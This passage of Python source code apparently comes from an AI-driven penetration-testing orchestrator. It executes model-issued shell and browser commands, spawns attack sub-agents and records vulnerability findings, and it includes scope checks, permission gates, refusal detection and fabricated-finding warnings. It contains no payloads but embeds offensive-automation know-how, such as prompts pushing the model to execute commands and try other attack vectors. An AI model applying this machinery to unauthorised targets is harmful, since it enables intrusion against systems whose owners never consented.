            if self._consecutive_cmd_failures >= 3:
                failed_summary = "\n".join(
                    f"  - {sig}" for sig in self._failed_cmd_signatures[-5:]
                )
                # Build suggestions based on what HASN'T been tried yet
                suggestions = self._get_untried_suggestions(current_response)
                action_results.append(
                    f"[Action Feedback]\n"
                    f"{self._consecutive_cmd_failures} consecutive commands have failed.\n"
                    f"Recent failures:\n{failed_summary}\n\n"
                    "Try a completely different approach. "
                    f"{suggestions}"
                )
                # Don't reset to 0 — allow the warning to escalate if failures continue
                self._consecutive_cmd_failures = max(0, self._consecutive_cmd_failures - 3)

            # Error-pattern circuit breaker: detect recurring ERROR types
            # even across different commands (e.g., IndentationError from multiple file writes)
            if self._recent_error_types:
                from collections import Counter
                error_counts = Counter(self._recent_error_types[-6:])
                for error_type, count in error_counts.items():
                    if count >= 2:
                        _ERROR_GUIDANCE = {
                            "IndentationError": (
                                "Your Python files have IndentationError. When using [WRITE_FILE], "
                                "write the code with proper indentation starting at column 0. "
                                "Do NOT indent the entire code block."
                            ),
                            "SyntaxError": (
                                "Your code has SyntaxError. Double-check string quotes, "
                                "parentheses, and Python syntax before writing the file."
                            ),
                            "ConnectionRefused": (
                                "The target is refusing connections on this port. Verify the "
                                "port is open before trying to connect."
                            ),
                            "NotFound": (
                                "Getting 404 Not Found errors. Use browser.links() to discover "
                                "actual URLs instead of guessing paths."
                            ),
                        }
                        guidance = _ERROR_GUIDANCE.get(
                            error_type,
                            f"The error '{error_type}' has occurred {count} times. Change your approach."
                        )
                        action_results.append(
                            f"[Action Feedback]\n"
                            f"RECURRING ERROR: '{error_type}' has occurred {count} times in recent commands.\n"
                            f"{guidance}"
                        )
                        self._recent_error_types = []
                        break

            if not action_results:
                # Only force actions in operational mode (target set).  In
                # standby mode the system prompt explicitly says "Do NOT
                # execute any commands", so injecting [Action Feedback] would
                # override that and cause the LLM to run unsolicited commands.
                in_operational_mode = bool(self.campaign.target)
                is_refusal = self._is_refusal_response(current_response)
                should_force_action = in_operational_mode and (
                    (depth == 0 and self._actions_executed_this_turn == 0)
                    or self._is_planning_without_actions(current_response)
                ) and not is_refusal
                if is_refusal:
                    if self._last_response_was_refusal:
                        display.show_info(
                            "Refusal loop suppressed. Switch scope with /scope <target>, "
                            "add local paths with /add-dir <path>, or ask for a safe test plan."
                        )
                    self._last_response_was_refusal = True
                    break
                if should_force_action:
                    self.logger.info("No actions in response (reasoning/planning-only turn)")
                    self.conversation.add_message(
                        "user",
                        "[Action Feedback] Your response promised actions but executed none. "
                        "Reply with at least one immediate [EXECUTE], [WRITE_FILE], or [SPAWN] block now. "
                        "No plans, no markdown headings.",
                    )
                    try:
                        followup = self._stream_response(self._build_system_prompt())
                        self.conversation.add_message("assistant", followup)
                        self.logger.log_conversation("assistant", followup)
                        accumulated = f"{accumulated}\n\n{followup}"
                        current_response = followup
                        depth += 1
                        continue
                    except Exception as e:
                        self.logger.log_error("CYRAX", f"Recovery generation failed: {e}")
                break

            # Feed results back to get follow-up
            self._last_response_was_refusal = False
            combined = "\n\n".join(action_results)
            self.conversation.add_message("user", f"[Action Results]\n{combined}")

            try:
                followup = self._stream_response(self._build_system_prompt())
                self.conversation.add_message("assistant", followup)
                self.logger.log_conversation("assistant", followup)
                accumulated = f"{accumulated}\n\n{followup}"
                current_response = followup
                depth += 1
            except Exception as e:
                self.logger.log_error("CYRAX", f"Follow-up generation failed: {e}")
                break

        # Don't clear _consecutive_cmd_failures here — persist across the response loop
        # so the AI retains awareness of accumulated failures
        return accumulated

    @staticmethod
    def _tokenize_text(text: str) -> set[str]:
        """Tokenize freeform text for lightweight overlap comparison."""
        return {
            token for token in re.findall(r"[a-zA-Z0-9_]+", text.lower())
            if len(token) > 2
        }

    def _get_latest_user_message(self) -> str:
        """Get the latest direct user prompt (excluding internal/tool feedback messages)."""
        for message in reversed(self.conversation.messages):
            if message.get("role") != "user":
                continue
            content = message.get("content", "")
            if content.startswith("[Action Results]") or content.startswith("[Internal Feedback]"):
                continue
            return content
        return ""

    def _detect_user_echo_overlap(self, response: str, latest_user_message: str) -> Optional[dict]:
        """Detect when model output overly echoes the user's latest message."""
        response_clean = response.strip()
        user_clean = latest_user_message.strip()
        if not response_clean or not user_clean:
            return None

        user_tokens = self._tokenize_text(user_clean)
        response_tokens = self._tokenize_text(response_clean)
        if not user_tokens or not response_tokens:
            return None

        token_overlap = len(user_tokens & response_tokens) / len(user_tokens)
        sequence_overlap = difflib.SequenceMatcher(
            None,
            user_clean.lower(),
            response_clean.lower(),
        ).ratio()

        if token_overlap >= 0.8 or sequence_overlap >= 0.85:
            return {
                "token_overlap": round(token_overlap, 3),
                "sequence_overlap": round(sequence_overlap, 3),
                "response_preview": response_clean[:200],
                "user_preview": user_clean[:200],
            }
        return None

    def _maybe_regenerate_echo_response(
        self,
        response: str,
        accumulated: str,
        depth: int,
        echo_regens: int,
    ) -> tuple[str, str, bool]:
        """Regenerate if response appears to be an echoed user prompt with no actions."""
        if _find_all_actions(response):
            return response, accumulated, False

        latest_user_message = self._get_latest_user_message()
        overlap = self._detect_user_echo_overlap(response, latest_user_message)
        if not overlap:
            return response, accumulated, False

        self.logger.log_event(
            "echo_response_detected",
            agent_id="CYRAX",
            data={"depth": depth, **overlap},
        )
        self.logger.warning(
            "Detected echoed response with high user-message overlap; requesting regeneration"
        )

        if echo_regens >= 1:
            return response, accumulated, False

        feedback = (
            "[Internal Feedback]\n"
            "Your prior response mostly echoed the user's input and contained no action blocks. "
            "Regenerate with new analysis and concrete next steps. "
            "Do not paraphrase the user message."
        )
        self.conversation.add_message("user", feedback)
        self.logger.log_event(
            "echo_regeneration_requested",
            agent_id="CYRAX",
            data={"depth": depth, "reason": "high_overlap_no_actions"},
        )

        try:
            followup = self._stream_response(self._build_system_prompt())
            self.conversation.add_message("assistant", followup)
            self.logger.log_conversation("assistant", followup)
            return followup, f"{accumulated}\n\n{followup}", True
        except Exception as e:
            self.logger.log_error("CYRAX", f"Echo regeneration failed: {e}")
            return response, accumulated, False

    @staticmethod
    def _get_cmd_pattern(command: str) -> str:
        """Extract a pattern signature from a command for failure dedup."""
        cmd = command.strip()
        m = re.match(r"(browser\.\w+\([^)]*\))", cmd)
        if m:
            return m.group(1)
        m2 = re.match(r"(browser\.\w+)\(", cmd)
        if m2:
            return m2.group(1)
        parts = cmd.split()
        if len(parts) >= 2:
            return f"{parts[0]}:{parts[1]}"
        return parts[0] if parts else cmd[:40]

    @staticmethod
    def _extract_error_type(error_output: str) -> str:
        """Extract a canonical error type from command output."""
        err = error_output.lower()
        if "indentationerror" in err:
            return "IndentationError"
        if "syntaxerror" in err:
            return "SyntaxError"
        if "modulenotfounderror" in err or "no module named" in err:
            return "ModuleNotFoundError"
        if "connectionrefused" in err or "connection refused" in err:
            return "ConnectionRefused"
        if "timeout" in err or "timed out" in err:
            return "Timeout"
        if "404" in err and ("not found" in err or "the requested url" in err):
            return "NotFound"
        if "permission denied" in err:
            return "PermissionDenied"
        return ""

    def _record_failure(self, command: str, error_output: str = ""):
        """Record a command failure with progressive tracking."""
        self._consecutive_cmd_failures += 1
        self._failed_cmd_signatures.append(command[:80])
        pattern = self._get_cmd_pattern(command)
        self._failed_pattern_counts[pattern] = self._failed_pattern_counts.get(pattern, 0) + 1

        # Track error types for cross-command error pattern detection
        if error_output:
            error_type = self._extract_error_type(error_output)
            if error_type:
                self._recent_error_types.append(error_type)
                self._recent_error_types = self._recent_error_types[-10:]

    def _check_repeated_failure(self, command: str) -> Optional[str]:
        """Progressive backoff: escalating messages for repeated failures."""
        pattern = self._get_cmd_pattern(command)
        count = self._failed_pattern_counts.get(pattern, 0)

        if count == 1:
            # Second attempt — warn
            return None  # Allow but the error will include guidance

        if count == 2:
            return (
                f"[Action Feedback] The pattern '{pattern}' has failed {count} times. "
                f"This approach is not working. Try something fundamentally different."
            )

        if count >= 3:
            return (
                f"[Action Feedback] The pattern '{pattern}' has failed {count} times. "
                f"Execution blocked. This approach will not work — use a completely "
                f"different tool or technique."
            )
        return None

    def _get_untried_suggestions(self, recent_response: str) -> str:
        """Suggest approaches the AI hasn't tried yet based on what's in the response."""
        suggestions = []
        resp_lower = recent_response.lower()
        failed_lower = " ".join(self._failed_cmd_signatures).lower()

        if "browser.intercept_requests" not in resp_lower and "intercept" not in failed_lower:
            suggestions.append("browser.intercept_requests() to capture API calls")
        if "browser.evaluate" not in resp_lower and "evaluate" not in failed_lower:
            suggestions.append("browser.evaluate() to run JavaScript directly")
        if "python" not in failed_lower and "write_file" not in resp_lower:
            suggestions.append("Write a Python script with [WRITE_FILE] for custom testing")
        if "browser.html" not in resp_lower:
            suggestions.append("browser.html() to inspect the raw page structure")
        if "curl" not in failed_lower and "httpx" not in failed_lower:
            suggestions.append("Direct HTTP requests with curl or a Python httpx script")

        if suggestions:
            return "Approaches you haven't tried:\n" + "\n".join(f"  - {s}" for s in suggestions[:3])
        return "Write a Python script, use an alternative tool, or switch to a different attack vector."

    def _is_planning_without_actions(self, text: str) -> bool:
        """Detect planning/progressive language that promises actions without executing any."""
        plan_patterns = (
            r"\bnext\b",
            r"\bi'll\b",
            r"\bi will\b",
            r"\bafter that\b",
            r"\bnow i'll\b",
            r"\bproceed(?:ing)? to\b",
        )
        lowered = text.lower()
        return any(re.search(pattern, lowered) for pattern in plan_patterns)

    def _is_refusal_response(self, text: str) -> bool:
        """Detect model refusal outputs so the loop does not amplify them."""
        lowered = text.strip().lower()
        refusal_markers = (
            "refused",
            "i will not",
            "i won't",
            "i cannot",
            "i can't",
            "refusal stands",
            "no action blocks will be executed",
            "no actions executed",
        )
        return any(marker in lowered[:600] for marker in refusal_markers)

    def _available_tool_names(self) -> str:
        """Return a compact, prompt-safe list of currently available tool names."""
        available = [name for name, tool in sorted(self.tools.tools.items()) if tool.available]
        if not available:
            return "none detected"
        return ", ".join(available[:25])

    def _execute_actions(self, response: str) -> list[str]:
        """
        Find and execute all action blocks in a response in document order.
        Returns a list of result strings (empty if no actions found).
        """
        from tools.executor import strip_markdown_fences

        actions = _find_all_actions(response)
        if not actions:
            actions = _find_tool_intent_actions(response)
        action_results = []

        # DEF-M07-1: Detect and feed back unclosed/malformed action tags so the
        # model knows its syntax was broken (otherwise it silently gets no results).
        unclosed = _find_unclosed_tags(response)
        if unclosed:
            tag_list = "; ".join(unclosed)
            action_results.append(
                f"[Action Feedback] Malformed action tag(s) detected — these were NOT executed: "
                f"{tag_list}. Each action tag must have a matching closing tag on its own line. "
                f"Example: [EXECUTE]\\nnmap -sV target\\n[/EXECUTE]"
            )

        for pos, action_type, match in actions:
            if self._pause_requested or self._hard_interrupt_requested:
                action_results.append("[Action Feedback] Pause requested. Stopping after current completed actions.")
                break
            # NOTE: _actions_executed_this_turn is incremented inside each branch
            # only when the action is actually dispatched — not for skipped/filtered actions.

            if action_type == "write_file":
                file_path = match.group(1).strip()
                content = strip_markdown_fences(match.group(2).strip())
                self._actions_executed_this_turn += 1
                result = self.tools.executor.write_file(file_path, content)
                style = "green" if result.success else "red"
                display.show_tool_event("write", file_path, result.output[:120], style=style)
                action_results.append(
                    f"[File Write Result for: {file_path}]\n"
                    f"Success: {result.success}\n"
                    f"Output: {result.output}"
                )
                if result.success:
                    self.mission.add_file(file_path)
                    self._cmds_succeeded_this_turn += 1

            elif action_type == "read_file":
                file_path = match.group(1).strip()
                self._actions_executed_this_turn += 1
                result = self.tools.executor.read_file(file_path)
                style = "green" if result.success else "red"
                display.show_tool_event("read", file_path, result.output[:160], style=style)
                action_results.append(
                    f"[File Read Result for: {file_path}]\n"
                    f"Success: {result.success}\n"
                    f"Output:\n{result.output}"
                )
                if result.success:
                    self._cmds_succeeded_this_turn += 1

            elif action_type in ("execute", "execute_text"):
                raw_cmd = match.strip() if action_type == "execute_text" else match.group(1).strip()
                if not raw_cmd:
                    continue
                raw_cmd = strip_markdown_fences(raw_cmd)
                # Sanitize: strip comments, nested tags, markdown prose
                sanitized = sanitize_command(raw_cmd)
                if not sanitized:
                    self.logger.info(f"EXECUTE block contained no valid command: {raw_cmd[:80]}")
                    continue
                cmds = split_compound_commands(sanitized)
                for command in cmds:
                    if self._pause_requested or self._hard_interrupt_requested:
                        action_results.append("[Action Feedback] Pause requested. Stopping before executing additional commands.")
                        break
                    command = command.strip()
                    if not command:
                        continue

                    # Duplicate detection: block exact same command within a turn
                    if command in self._recent_cmds_this_turn:
                        dup_msg = (
                            f"[Action Feedback] Duplicate command blocked: '{command[:60]}' "
                            f"was already executed this turn. Try a different command."
                        )
                        action_results.append(f"[Tool Result for: {command}]\n{dup_msg}")
                        continue
                    self._recent_cmds_this_turn.append(command)

                    display.show_tool_event("run", command)

                    # Check repeated failure (progressive backoff)
                    blocked_msg = self._check_repeated_failure(command)
                    if blocked_msg:
                        display.show_tool_event("blocked", command, blocked_msg, style="yellow")
                        action_results.append(f"[Tool Result for: {command}]\n{blocked_msg}")
                        continue

                    # Browser commands must not be chained with shell operators/pipes
                    if is_browser_command(command) and browser_command_has_shell_operators(command):
                        error_msg = (
                            "Error: Browser commands cannot be piped/chained with shell operators.\n"
                            "Run browser commands in their own [EXECUTE] blocks, then process output in a separate shell command."
                        )
                        display.show_tool_event("error", command, error_msg, style="red")
                        action_results.append(f"[Tool Result for: {command}]\n{error_msg}")
                        self._record_failure(command, error_msg)
                        continue

                    # Scope check for browser navigation
                    browser_parsed = parse_browser_command(command)
                    if browser_parsed:
                        method_name, args, kwargs = browser_parsed

                        sig_error = validate_browser_command(method_name, args, kwargs)
                        if sig_error:
                            msg = f"[Tool Result for: {command}]\nError: {sig_error}"
                            display.show_tool_event("error", command, sig_error, style="red")
                            action_results.append(msg)
                            self._record_failure(command, sig_error)
                            continue

                        # Scope enforcement on browser.goto()
                        if method_name == "goto" and args:
                            allowed, reason = self.scope.check_browser_navigation(args[0])
                            if not allowed:
                                scope_msg = f"[Scope Violation] {reason}"
                                display.show_tool_event("blocked", command, scope_msg, style="yellow")
                                action_results.append(f"[Tool Result for: {command}]\n{scope_msg}")
                                # DEF-M09-1: Persist scope violations to JSONL audit trail
                                self.logger.log_event("scope_violation", "CYRAX", {
                                    "command": command[:200],
                                    "reason": reason,
                                    "action_type": "browser_navigate",
                                })
                                continue

                        # Permission gate for attack payloads
                        perm_ok, perm_reason = self.permission_gate.check(command)
                        if not perm_ok:
                            perm_msg = f"[Permission Denied] {perm_reason}"
                            display.show_tool_event("denied", command, perm_reason, style="yellow")
                            action_results.append(
                                f"[Tool Result for: {command}]\n{perm_msg}\n"
                                "The user declined this action. Try a different approach or ask for guidance."
                            )
                            # DEF-M09-1: Persist permission denials to JSONL audit trail
                            self.logger.log_event("permission_denied", "CYRAX", {
                                "command": command[:200],
                                "reason": perm_reason,
                                "action_type": self.permission_gate.classify_action(command),
                            })
                            continue

                        # Fix browser.type -> type_text mapping
                        actual_method_name = method_name
                        if method_name == "type":
                            actual_method_name = "type_text"

                        method = getattr(self.browser, actual_method_name, None)
                        if method:
                            try:
                                self._actions_executed_this_turn += 1
                                with display.get_spinner("Executing..."):
                                    br_result = method(*args, **kwargs)
                                style = "green" if br_result.success else "red"
                                display.show_tool_event("browser", command, br_result.output[:160], style=style)
                                self.logger.log_command(
                                    "CYRAX", command, br_result.output,
                                    0 if br_result.success else 1,
                                )
                                action_results.append(
                                    f"[Tool Result for: {command}]\n"
                                    f"Success: {br_result.success}\n"
                                    f"Output:\n{br_result.output}"
                                )
                                if br_result.success:
                                    self._consecutive_cmd_failures = 0
                                    self._cmds_succeeded_this_turn += 1
                                else:
                                    guidance = _get_failure_guidance(command, br_result.error or "")
                                    action_results[-1] += (
                                        f"\nNOTE: This command failed. Do NOT retry it.{guidance}"
                                    )
                                    self._record_failure(command, br_result.error or br_result.output)
                            except Exception as e:
                                error_msg = f"Browser error: {e}"
                                display.show_tool_event("error", command, error_msg, style="red")
                                guidance = _get_failure_guidance(command, str(e))
                                action_results.append(
                                    f"[Tool Result for: {command}]\nError: {error_msg}\n{guidance}"
                                )
                                self._record_failure(command, str(e))
                        else:
                            # Method doesn't exist — provide full valid method list
                            valid_methods = ", ".join(sorted(BROWSER_COMMANDS.keys()))
                            error_msg = (
                                f"Error: '{method_name}' is not a valid browser method.\n"
                                f"Valid methods: {valid_methods}\n"
                                f"For SQL injection testing, use sqlmap or write a Python script."
                            )
                            display.show_tool_event("error", command, error_msg, style="red")
                            action_results.append(
                                f"[Tool Result for: {command}]\n{error_msg}"
                            )
                            self._record_failure(command, error_msg)
                    elif is_browser_command(command):
                        method_match = re.match(r"browser\.(\w+)\(", command)
                        bad_method = method_match.group(1) if method_match else "unknown"
                        valid_methods = ", ".join(sorted(BROWSER_COMMANDS.keys()))
                        error_msg = (
                            f"Error: 'browser.{bad_method}()' does not exist.\n"
                            f"Valid methods: {valid_methods}\n"
                            f"Do NOT invent browser methods."
                        )
                        display.show_tool_event("error", command, error_msg, style="red")
                        action_results.append(
                            f"[Tool Result for: {command}]\n{error_msg}"
                        )
                        self._record_failure(command, error_msg)
                    else:
                        # Shell command — scope check
                        scope_ok, scope_reason = self.scope.check_command(command)
                        if not scope_ok:
                            scope_msg = f"[Scope Violation] {scope_reason}"
                            display.show_tool_event("blocked", command, scope_msg, style="yellow")
                            action_results.append(f"[Tool Result for: {command}]\n{scope_msg}")
                            # DEF-M09-1: Persist scope violations to JSONL audit trail
                            self.logger.log_event("scope_violation", "CYRAX", {
                                "command": command[:200],
                                "reason": scope_reason,
                                "action_type": "shell_command",
                            })
                            continue

                        # Permission check
                        perm_ok, perm_reason = self.permission_gate.check(command)
                        if not perm_ok:
                            perm_msg = f"[Permission Denied] {perm_reason}"
                            display.show_tool_event("denied", command, perm_reason, style="yellow")
                            action_results.append(f"[Tool Result for: {command}]\n{perm_msg}")
                            # DEF-M09-1: Persist permission denials to JSONL audit trail
                            self.logger.log_event("permission_denied", "CYRAX", {
                                "command": command[:200],
                                "reason": perm_reason,
                                "action_type": self.permission_gate.classify_action(command),
                            })
                            continue

                        self._actions_executed_this_turn += 1
                        with display.get_spinner("Executing..."):
                            result = self.tools.execute_raw(command)
                        style = "green" if result.success else "red"
                        display.show_tool_event("shell", command, result.output[:160], style=style)
                        self.logger.log_command("CYRAX", command, result.output, result.exit_code)
                        if result.success:
                            action_results.append(
                                f"[Tool Result for: {command}]\n"
                                f"Exit code: {result.exit_code}\n"
                                f"Output:\n{result.output}"
                            )
                            self._consecutive_cmd_failures = 0
                            self._cmds_succeeded_this_turn += 1
                        else:
                            guidance = _get_failure_guidance(command, result.output)
                            missing_tool = ("not recognized as an internal or external command" in result.output.lower() or "command not found" in result.output.lower())
                            tool_hint = ""
                            if missing_tool:
                                tool_hint = (
                                    "\n[Tool Availability] That tool is not installed in this environment. "
                                    f"Available tools include: {self._available_tool_names()}"
                                )
                            action_results.append(
                                f"[Tool Result for: {command}]\n"
                                f"Exit code: {result.exit_code}\n"
                                f"Output:\n{result.output}{tool_hint}\n"
                                f"NOTE: This command failed. Do NOT retry it. "
                                f"Analyze the error and try a different approach.{guidance}"
                            )
                            self._record_failure(command, result.output)

            elif action_type == "spawn":
                agent_type = match.group(1)
                task = match.group(2).strip()
                self._actions_executed_this_turn += 1
                report = self._spawn_and_run_agent(agent_type, task)
                if report:
                    if report.get("status") == "spawned":
                        # Non-blocking: agent is running in background
                        self._cmds_succeeded_this_turn += 1
                        action_results.append(
                            f"[Agent {report['agent_id']} Spawned]\n"
                            f"Status: running in background (PID will be assigned)\n"
                            f"Task: {report['task']}\n"
                            f"The agent will report findings via IPC as they are discovered. "
                            f"Use [KILL agent=\"{report['agent_id']}\"] to stop it."
                        )
                    elif report.get("status") == "skipped":
                        action_results.append(
                            f"[Agent Spawn Skipped]\nSummary: {report['summary']}"
                        )
                    else:
                        self._cmds_succeeded_this_turn += 1
                        action_results.append(
                            f"[Agent {report['agent_id']} Report]\n"
                            f"Status: {report['status']}\n"
                            f"Summary: {report['summary']}"
                        )

            elif action_type == "kill":
                target_agent = match.group(1).strip()
                reason = match.group(2) or "Orchestrator requested kill"
                killed = self.agent_pool.kill(target_agent, graceful=True, timeout=10.0)
                if killed:
                    display.show_info(f"Agent {target_agent} killed: {reason}")
                    action_results.append(
                        f"[Agent Kill Result]\n"
                        f"Agent {target_agent} has been terminated. Reason: {reason}"
                    )
                else:
                    action_results.append(
                        f"[Agent Kill Result]\n"
                        f"Agent {target_agent} not found or already terminated."
                    )

            elif action_type == "store":
                category = match.group(1)
                key = match.group(2)
                data_str = match.group(3).strip()
                try:
                    data = {"raw": data_str}
                    self.knowledge.store(category, key, data)
                    self.logger.info(f"Stored data: {category}/{key}")
                except Exception as e:
                    self.logger.log_error("CYRAX", f"Failed to store data: {e}")

            elif action_type == "finding":
                severity = match.group(1)
                title = match.group(2)
                details = match.group(3).strip()

                # Fabricated finding prevention: check if any commands
                # actually succeeded to back up this finding
                if self._cmds_succeeded_this_turn == 0 and self._actions_executed_this_turn > 0:
                    display.show_warning(
                        f"Finding '{title}' may be fabricated — no commands succeeded this turn. "
                        f"Findings must be backed by actual command output."
                    )
                    action_results.append(
                        f"[Action Feedback] WARNING: Your finding '{title}' appears fabricated. "
                        f"All {self._actions_executed_this_turn} commands executed this turn FAILED. "
                        f"Do NOT report findings without successful command output as evidence. "
                        f"Run commands, verify results, THEN report findings."
                    )
                    continue

                display.show_finding(severity, title, details)
                self.knowledge.store_finding(
                    title=title,
                    severity=severity,
                    description=details,
                    target=self.campaign.target,
                    target_url_host=self.campaign.target,
                )
                self.logger.log_finding("CYRAX", severity, title, details)
                # DEF-M08-4: Let add_vuln() apply its own 200-char cap;
                # previously we passed details[:100] which caused double-truncation.
                self.mission.add_vuln(title, url=self.campaign.target,
                                      evidence=details)

        return action_results

    def _spawn_and_run_agent(self, agent_type: str, task: str) -> Optional[dict]:
        """Spawn a specialized sub-agent as a separate subprocess (non-blocking)."""
        if agent_type not in AGENT_CLASSES:
            self.logger.log_error(
                "CYRAX", f"Unknown agent type: {agent_type}"
            )
            display.show_error(f"Unknown agent type: {agent_type}")
            return None

        # Prevent runaway agent spawning: cap active agents and dedupe near-identical tasks
        active = self.agent_pool.active_count()
        if active >= 4:
            msg = (
                f"Agent spawn skipped: {active} agents already active. "
                "Wait for results or kill existing agents before spawning more."
            )
            display.show_warning(msg)
            self.logger.info(msg)
            return {
                "agent_id": "N/A",
                "status": "skipped",
                "task": task,
                "summary": msg,
            }

        task_norm = " ".join(task.lower().split())
        for aid, info in self.agent_pool.get_status().items():
            if info.get("status") in ("starting", "active"):
                existing = " ".join((info.get("task") or "").lower().split())
                if existing and (task_norm in existing or existing in task_norm):
                    msg = (
                        f"Agent spawn skipped: task overlaps with active agent {aid}. "
                        "Use /agents to inspect running tasks."
                    )
                    display.show_warning(msg)
                    self.logger.info(msg)
                    return {
                        "agent_id": aid,
                        "status": "skipped",
                        "task": task,
                        "summary": msg,
                    }

        count = self.agent_counter.get(agent_type, 0)
        self.agent_counter[agent_type] = count + 1
        agent_id = f"{agent_type.upper()}-{count:02d}"

        display.show_spawning_agent(agent_id, agent_type, task)
        self.logger.log_agent_spawn("CYRAX", agent_id, agent_type, task)

        # Update mission memory with latest browser state before briefing
        self.mission.extract_from_browser(self.browser)
        self.mission.register_agent(agent_id, agent_type, task)

        # Build mission briefing for the sub-agent
        mission_briefing = self.mission.build_agent_briefing(agent_type, task)

        # Build configs for the subprocess
        model_config = {
            "provider": self.model.provider,
            "model_name": self.model.model_name,
            "temperature": self.model.temperature,
            "max_tokens": self.model.max_tokens,
        }
        tool_config = {
            "work_dir": str(self.tools.executor.work_dir),
            "timeout": self.tools.executor.timeout,
            "allow_dangerous": self.tools.executor.allow_dangerous,
        }
        scope_config = {
            "enabled": self.scope.enabled,
            "raw_targets": self.scope._raw_targets if self.scope.enabled else [],
        }
        permission_config = {
            "auto_approve": self.permission_gate.auto_approve,
            "session_approvals": dict(self.permission_gate.session_approvals),
        }

        # Spawn subprocess via pool (non-blocking — returns immediately)
        self.agent_pool.spawn(
            agent_id=agent_id,
            agent_type=agent_type,
            task=task,
            model_config=model_config,
            tool_config=tool_config,
            scope_config=scope_config,
            permission_config=permission_config,
            mission_briefing=mission_briefing,
            mission_memory_snapshot=self.mission.to_dict(),
            campaign_dir=str(self._campaign_dir) if self._campaign_dir else "",
        )

        # Register in campaign state with PID info (PID comes via IPC later)
        status = self.agent_pool.get_status().get(agent_id, {})
        self.campaign.register_agent(
            agent_id,
            agent_type,
            task,
            pid=status.get("pid", 0),
            socket_path=status.get("socket_path", ""),
            session_id=self._session_id,
            socket_generation=status.get("socket_generation", 1),
        )

        # Return placeholder — agent is running in background
        return {
            "agent_id": agent_id,
            "task": task,
            "status": "spawned",
            "iterations": 0,
            "summary": (
                f"Agent {agent_id} spawned as background process. "
                f"It will report findings as they are discovered."
            ),
            "findings": [],
        }

    def _permission_prompt_active(self) -> bool:
        """Return True while the permission gate is actively prompting the user."""
        checker = getattr(self.permission_gate, "is_prompt_active", None)
        return bool(checker and checker())

    def receive_agent_update(self, agent_id: str, update: str):
        """Receive an interim update from a sub-agent."""
        if self._permission_prompt_active():
            self.logger.log_event(
                "agent_update_buffered", agent_id, {"update": update[:500]}
            )
        else:
            display.show_agent_message(agent_id, update)
        self.logger.log_event(
            "agent_update", agent_id, {"update": update[:500]}
        )

    def _on_agent_finding(self, agent_id: str, finding: dict):
        """Callback: agent discovered a finding via IPC."""
        severity = finding.get("severity", "info")
        title = finding.get("title", "Untitled finding")
        details = finding.get("details", finding.get("description", ""))
        display.show_finding(severity, f"[{agent_id}] {title}", details)
        self.knowledge.store_finding(
            title=f"[{agent_id}] {title}",
            severity=severity,
            description=details,
            target=self.campaign.target,
            agent_id=agent_id,
            target_url_host=self.campaign.target,
        )
        self.logger.log_finding(agent_id, severity, title, details)
        self.mission.add_vuln(title, url=self.campaign.target,
                              evidence=details[:100])

    def _on_agent_report(self, agent_id: str, update: str):
        """Callback: agent sent a status report/update via IPC."""
        if self._permission_prompt_active():
            self.logger.log_event(
                "agent_report_buffered", agent_id, {"update": update[:500]}
            )
        else:
            display.show_agent_message(agent_id, update)
        self.logger.log_event("agent_report", agent_id, {"update": update[:500]})

    def _on_agent_permission_request(self, agent_id: str, request: dict):
        """Callback: agent needs permission to execute a command."""
        command = request.get("command", "")
        request_id = request.get("request_id", "")
        action_type = request.get("action_type", "unknown")

        if self._hard_interrupt_requested:
            self.agent_pool.respond_permission(
                agent_id,
                request_id,
                False,
                "Session interrupted. Command blocked.",
            )
            return

        display.show_info(
            f"Agent {agent_id} requests permission [{action_type}]: {command[:100]}"
        )

        # Check with our local permission gate. Sub-agents should follow the
        # same interactive permission workflow as orchestrator commands.
        allowed, reason = self.permission_gate.check(command, allow_prompt=True)
        self.agent_pool.respond_permission(agent_id, request_id, allowed, reason)

        if not allowed:
            display.show_info(f"Permission denied for {agent_id}: {reason}")

    def _on_agent_status(self, agent_id: str, payload: dict):
        """Callback: persist heartbeat/reconnect metadata from agent updates."""
        self.campaign.update_agent_reconnect_metadata(
            agent_id,
            session_id=payload.get("session_id", self._session_id),
            socket_generation=payload.get("socket_generation"),
            last_heartbeat=time.time(),
        )

    def _on_agent_complete(self, agent_id: str, report: dict):
        """Callback: agent subprocess finished."""
        status = report.get("status", "unknown")
        summary = report.get("summary", "No summary")
        findings = report.get("findings", [])

        # Include accurate remaining-agent count in the completion message
        remaining = max(0, self.agent_pool.active_count() - 1)
        remaining_str = f", {remaining} still active" if remaining > 0 else ""
        display.show_info(
            f"Agent {agent_id} completed ({status}): "
            f"{len(findings)} findings{remaining_str}. {summary[:120]}"
        )

        # Store the report
        self.agent_reports.append(report)

        # Register findings that weren't already sent via IPC
        for finding in findings:
            if isinstance(finding, dict) and finding.get("title"):
                self.knowledge.store_finding(
                    title=f"[{agent_id}] {finding['title']}",
                    severity=finding.get("severity", "info"),
                    description=finding.get("details", finding.get("description", "")),
                    target=self.campaign.target,
                    agent_id=agent_id,
                    target_url_host=self.campaign.target,
                )

        # Update campaign state
        self.campaign.update_agent_status(agent_id, status)
        pool_status = self.agent_pool.get_status().get(agent_id, {})
        self.campaign.update_agent_reconnect_metadata(
            agent_id,
            pid=pool_status.get("pid"),
            socket_path=pool_status.get("socket_path"),
            socket_generation=pool_status.get("socket_generation"),
            last_heartbeat=pool_status.get("last_heartbeat"),
            session_id=self._session_id,
        )
        self.mission.update_agent(agent_id, status)

        self.logger.log_event("agent_complete", agent_id, {
            "status": status,
            "findings_count": len(findings),
            "summary": summary[:200],
        })

    def _reconnect_orphaned_agents(self):
        """Reconnect to orphaned agent processes from a previous session (daemon mode)."""
        if not self._campaign_dir:
            return
        orphaned = self.campaign.get_orphaned_agents()
        if not orphaned:
            return
        reconnected = 0
        for agent_info in orphaned:
            agent_id = agent_info.get("agent_id", "")
            pid = agent_info.get("pid", 0)
            socket_path = agent_info.get("socket_path", "")
            if agent_id and pid:
                success = self.agent_pool.reconnect_agent(
                    agent_id, pid, agent_info, socket_path,
                )
                if success:
                    reconnected += 1
                    info = self.agent_pool.get_status().get(agent_id, {})
                    self.campaign.update_agent_reconnect_metadata(
                        agent_id,
                        pid=pid,
                        socket_path=info.get("socket_path"),
                        socket_generation=info.get("socket_generation"),
                        last_heartbeat=info.get("last_heartbeat"),
                        session_id=self._session_id,
                    )
                    self.campaign.update_agent_status(agent_id, "active")
                    display.show_info(
                        f"Reconnected to orphaned agent {agent_id} (PID {pid})"
                    )
        if reconnected:
            display.show_info(f"Reconnected to {reconnected} orphaned agent(s)")

    def _poll_completed_agents(self) -> list[str]:
        """Poll for completed agent reports and return feedback strings."""
        completed = self.agent_pool.get_completed()
        feedback = []
        for report in completed:
            agent_id = report.get("agent_id", "unknown")
            status = report.get("status", "unknown")
